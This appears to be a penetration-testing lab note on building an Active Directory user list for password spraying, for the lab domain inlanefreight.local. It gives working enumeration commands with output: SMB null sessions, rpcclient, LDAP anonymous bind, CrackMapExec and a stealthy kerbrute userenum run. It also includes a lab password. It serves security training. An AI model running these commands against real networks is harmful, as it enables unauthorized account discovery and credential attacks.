# Password Spraying - Making a Target User List

## Introduction

In order to be <mark style="color:yellow;">successful</mark> with a <mark style="color:yellow;">password spraying attack</mark>, we will need a list of <mark style="color:yellow;">valid domain users</mark> to authenticate with.&#x20;

There are <mark style="color:yellow;">several ways that we can gather a target list of valid users</mark>:

* <mark style="color:red;">SMB NULL Session</mark>
* <mark style="color:red;">LDAP Anonymous Bind</mark>
* <mark style="color:red;">Kerbrute's Userenum Function</mark>
  * [https://github.com/initstring/linkedin2username](https://github.com/initstring/linkedin2username)
  * [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
* <mark style="color:red;">Response poisoning LLMNR/NBT-NS with Responder</mark>

### Important

* <mark style="color:yellow;">Always keep a record of what you did and the time you executed a password spray attack to ensure it was you and it wasn't a legitimate nefarious attempt</mark>

Example Record:

* The accounts targeted
* Domain Controller used in the attack
* Time of the spray
* Date of the spray
* Password(s) attempted

## SMB NULL Session to Pull User List

* <mark style="color:yellow;">If you are on an internal machine without domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers</mark>
* These configurations will allow you to obtain an accurate list of all the suers within AD
  * This will in return allow you to obtain the password policy

### Enum4Linux

```
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

administrator
guest
krbtgt
lab_adm
htb-student
avazquez
pfalcon
fanthony
wdillard
lbradford
sgage
asanchez
dbranch
ccruz
njohnson
mholliday
```

### Rpcclient

* We can use <mark style="color:yellow;">`enumdomusers`</mark> after connecting anonymously with rpcclient

```
rpcclient -U "" -N 172.16.5.5

rpcclient $> enumdomusers 
user:[administrator] rid:[0x1f4]
user:[guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[lab_adm] rid:[0x3e9]
user:[htb-student] rid:[0x457]
user:[avazquez] rid:[0x458]
```

### CrackMapExec

```
crackmapexec smb 172.16.5.5 --users
```

## Gathering Users with LDAP Anonymous

### ldapsearch

```
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
```

* To make this easier, we can use a pool such as <mark style="color:yellow;">`windapsearch.py`</mark>

```
./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
```

## Enumerating Users with Kerbrute

* <mark style="color:yellow;">This is my FAVORITE way to enumerate/validate AD accounts and password spray</mark>
* Kerbrute utilizes Kerberos <mark style="color:yellow;">Pre-Authentication</mark>
  * This is a much <mark style="color:red;">faster and stealthier way to perform password spraying</mark>
* The tool will send the DC TGT requests without Kerberos Pre-Authentication to perform username enumeration

Use the jsmith.txt wordlist: [https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt](https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt)

* Consists of over 48k usernames
* Kerbrute can exhaust this list in under 15 seconds

```
./kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt

   __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop

2022/02/17 22:16:11 >  Using KDC(s):
2022/02/17 22:16:11 >  	172.16.5.5:88

2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/02/17 22:16:11 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local

```

## Best way to Enumerate w/ Credentials -- CME

* When we have confirmed valid credentials we should resort to CrackMapExec&#x20;

```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
```
